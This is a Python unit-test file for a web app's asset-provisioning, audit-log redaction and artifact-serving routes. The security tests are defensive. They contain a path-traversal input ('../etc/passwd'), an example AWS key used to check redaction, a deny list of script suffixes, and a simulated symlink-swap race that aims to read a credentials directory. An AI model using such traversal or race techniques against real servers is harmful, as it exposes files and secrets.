        """The UI polls this state; an unbounded list would grow for the whole
        download and be re-joined on every append."""
        lines: list[str] = []
        for i in range(900):
            routes._record_assets_log(lines, f"line {i}")
        self.assertEqual(len(lines), 400)
        self.assertEqual(lines[-1], "line 899")


class TestAssetsStatusRoute(_RoutesFixture):
    async def test_status_reports_every_source_and_the_engine_tag(self) -> None:
        with (
            _enabled(True),
            mock.patch.object(routes.engine, "user_config_dir", return_value=None),
            mock.patch.object(routes.engine, "engine_tag", return_value="v0.3.8"),
        ):
            resp = await self.client.get(self.url("/assets"))
        self.assertEqual(resp.status, 200)
        body = await resp.json()
        self.assertEqual(body["sources"], [s for s, _ in engine.ICON_SOURCES])
        self.assertEqual(body["tag"], "v0.3.8")
        # A not-ready engine must report every pack as unprovisioned, not ready.
        self.assertFalse(body["ready"])
        self.assertFalse(any(body["provisioned"].values()))

    async def test_provision_refuses_to_start_twice(self) -> None:
        """One job at a time: a second POST while running must not spawn a
        parallel download over the same target directory."""
        with _enabled(True):
            routes._assets_state.state = "running"
            try:
                with mock.patch.object(routes, "_provision_assets") as worker:
                    resp = await self.client.post(self.url("/assets/provision"))
                self.assertEqual(resp.status, 202)
                self.assertEqual((await resp.json())["state"], "running")
                worker.assert_not_called()
            finally:
                routes._assets_state.state = "idle"

    async def test_provision_forwards_the_force_flag(self) -> None:
        """``?force=true`` is what re-downloads an already-provisioned pack; if it
        were dropped the endpoint would silently no-op for those users."""
        seen: list[bool] = []
        with _enabled(True), mock.patch.object(
            routes, "_provision_assets", side_effect=seen.append
        ):
            resp = await self.client.post(self.url("/assets/provision?force=true"))
            self.assertEqual(resp.status, 202)
            await _await_detached(lambda: bool(seen))
        routes._assets_state.state = "idle"
        self.assertEqual(seen, [True])

    async def test_provision_defaults_to_not_forcing(self) -> None:
        seen: list[bool] = []
        with _enabled(True), mock.patch.object(
            routes, "_provision_assets", side_effect=seen.append
        ):
            resp = await self.client.post(self.url("/assets/provision"))
            self.assertEqual(resp.status, 202)
            await _await_detached(lambda: bool(seen))
        routes._assets_state.state = "idle"
        self.assertEqual(seen, [False])


class TestAuditRedaction(unittest.TestCase):
    """The SEL is a user-facing surface, and a DURABLE one.

    Every `_audit` call site interpolates a value the user or the agent chose — a
    style/template name, a deck root, a `deckId/subpath`, an exception string — and
    an `AKIA`-shaped name is legal under `SEGMENT_RE`. Unredacted, that credential
    was written verbatim into the audit log and served back by `GET /api/sel/events`.
    Unlike a response body, a leak here persists.

    Redaction lives in `_audit` itself rather than at the dozen call sites, so a
    future caller cannot forget it.
    """

    def _capture(self, **kwargs) -> dict:
        seen: dict = {}

        class _FakeSel:
            def log_api_access(self, **kw):  # noqa: ANN003 - mirrors the sel API
                seen.update(kw)

        with mock.patch.object(routes, "sel", lambda: _FakeSel()):
            routes._audit(**kwargs)
        return seen

    def test_a_credential_in_the_resources_field_is_redacted(self) -> None:
        seen = self._capture(
            operation="style_import", resources="AKIAIOSFODNN7EXAMPLE", outcome="ok"
        )
        self.assertNotIn("AKIAIOSFODNN7EXAMPLE", seen["resources"])
        self.assertIn("REDACTED", seen["resources"])

    def test_a_credential_in_the_error_field_is_redacted(self) -> None:
        seen = self._capture(
            operation="style_import",
            resources="brand",
            outcome="failed",
            error="write failed for AKIAIOSFODNN7EXAMPLE",
        )
        self.assertNotIn("AKIAIOSFODNN7EXAMPLE", seen["error"])

    def test_redaction_runs_before_truncation(self) -> None:
        """Order is load-bearing. Truncating FIRST can slice a credential in half so
        neither fragment matches a pattern — the same screen-after-decode mistake the
        artifact reader documents. The credential is placed so that it straddles the
        200-char boundary, which is exactly the case a truncate-then-redact
        implementation leaks."""
        error = "x" * 190 + "AKIAIOSFODNN7EXAMPLE" + "y" * 50
        seen = self._capture(
            operation="style_import", resources="brand", outcome="failed", error=error
        )
        self.assertNotIn("AKIA", seen["error"])
        # Still bounded.
        self.assertLessEqual(len(seen["error"]), 200)

    def test_ordinary_values_pass_through_unchanged(self) -> None:
        seen = self._capture(
            operation="style_rename", resources="brand->brand-v2", outcome="ok"
        )
        self.assertEqual(seen["resources"], "brand->brand-v2")
        self.assertEqual(seen["error"], "")


class TestReadArtifactWorker(unittest.TestCase):
    """The size cap and the extension allow-list live here rather than in
    ``paths``; containment is ``paths.resolve_deck_file``'s job."""

    def test_a_path_the_sanitizer_refuses_is_not_read(self) -> None:
        with mock.patch.object(routes.paths, "resolve_deck_file", return_value=None):
            self.assertIsNone(routes._read_artifact("deck", "../etc/passwd"))

    def test_an_unreadable_file_is_none_not_an_exception(self) -> None:
        """This runs on a worker thread; an escaping OSError would become an
        opaque 500 instead of the route's 404."""
        with mock.patch.object(
            routes.paths, "resolve_deck_file", return_value=Path("/absent/x.md")
        ):
            self.assertIsNone(routes._read_artifact("deck", "x.md"))

    def test_every_served_suffix_maps_to_a_content_type(self) -> None:
        """A suffix on the allow-list with no type would be served as the
        default, letting a browser sniff it."""
        for suffix, served in routes.SERVED_SUFFIXES.items():
            self.assertTrue(suffix.startswith("."), suffix)
            self.assertTrue(served.content_type, suffix)

    def test_no_executable_or_script_suffix_is_on_the_allow_list(self) -> None:
        """Deck contents are model-influenced, so the allow-list is the thing
        standing between that and a browser."""
        for bad in (".js", ".mjs", ".html.js", ".sh", ".py", ".wasm", ".xhtml", ".svgz"):
            self.assertNotIn(bad, routes.SERVED_SUFFIXES)

    def test_an_intermediate_directory_swapped_after_resolution_is_refused(self) -> None:
        """The check-to-use window `O_NOFOLLOW` alone does NOT close.

        `O_NOFOLLOW` makes only the FINAL component's symlink-ness fatal. The deck
        root is agent-written, so an INTERMEDIATE directory can be swapped for a
        symlink after `resolve_deck_file` validated the path and before the open —
        and the read then lands outside the deck entirely. Demonstrated against the
        pre-fix code: replacing `compose/` with a link to a credential directory
        served that directory's file to the browser.

        The swap is injected inside the `resolve_deck_file` call itself, which is
        exactly the window a real racing writer has. `safe_read_file_bytes_nolink`
        closes it by validating the OPENED DESCRIPTOR's real path against
        `within_root`, so the inode checked is the inode read.

        The link is made through ``make_dir_link`` so Windows uses a junction: a
        directory symlink there needs a privilege an unelevated shell lacks, and
        the escape it models — an intermediate reparse point the containment check
        must catch — is identical either way.
        """
        with tempfile.TemporaryDirectory() as tmp:
            root = Path(tmp) / "decks"
            deck = root / "20260101-demo"
            (deck / "compose").mkdir(parents=True)
            (deck / "compose" / "slide.json").write_text('{"ok":1}', encoding="utf-8")
            outside = Path(tmp) / "credentials"
            outside.mkdir()
            (outside / "slide.json").write_text('{"auth":"SUPERSECRET"}', encoding="utf-8")

            prior = os.environ.get(routes.paths.DECK_ROOT_ENV)
            os.environ[routes.paths.DECK_ROOT_ENV] = str(root)
            try:
                # Quick check: the honest read works, so a pass below cannot be
                # vacuous.
                served = routes._read_artifact("20260101-demo", "compose/slide.json")
                self.assertIsNotNone(served)

                real_resolve = routes.paths.resolve_deck_file

                def resolve_then_swap(deck_id: str, subpath: str):
                    resolved = real_resolve(deck_id, subpath)
                    shutil.rmtree(deck / "compose")
                    make_dir_link(deck / "compose", outside)
                    return resolved

                with mock.patch.object(
                    routes.paths, "resolve_deck_file", side_effect=resolve_then_swap
                ):
                    result = routes._read_artifact("20260101-demo", "compose/slide.json")
                self.assertIsNone(result)
            finally:
                if prior is None:
                    os.environ.pop(routes.paths.DECK_ROOT_ENV, None)
                else:
                    os.environ[routes.paths.DECK_ROOT_ENV] = prior


if __name__ == "__main__":
    unittest.main()
